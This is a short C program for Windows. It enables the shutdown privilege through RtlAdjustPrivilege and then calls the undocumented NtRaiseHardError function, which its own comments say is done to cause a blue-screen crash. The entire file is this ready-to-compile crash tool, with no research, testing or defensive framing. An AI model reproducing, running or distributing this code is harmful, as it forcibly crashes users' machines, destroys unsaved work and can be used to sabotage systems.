#include <windows.h>

typedef NTSTATUS(NTAPI *TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

typedef NTSTATUS(NTAPI *TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow)
{
	HMODULE hNtdll = GetModuleHandle("ntdll.dll");

	if (hNtdll != 0)
	{
		NTSTATUS s1, s2;
		BOOLEAN b;
		ULONG r;
		
		//Enable shutdown privilege
		//More https://msdn.microsoft.com/en-us/library/bb530716%28VS.85%29.aspx
		
		TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = (TFNRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
		s1 = pfnRtlAdjustPrivilege(19, true, false, &b);
		
		//Cause BSOD
		//More about NtRaiseHardError here http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtRaiseHardError.html
		
		TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
		s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
	}
	return 0;
}
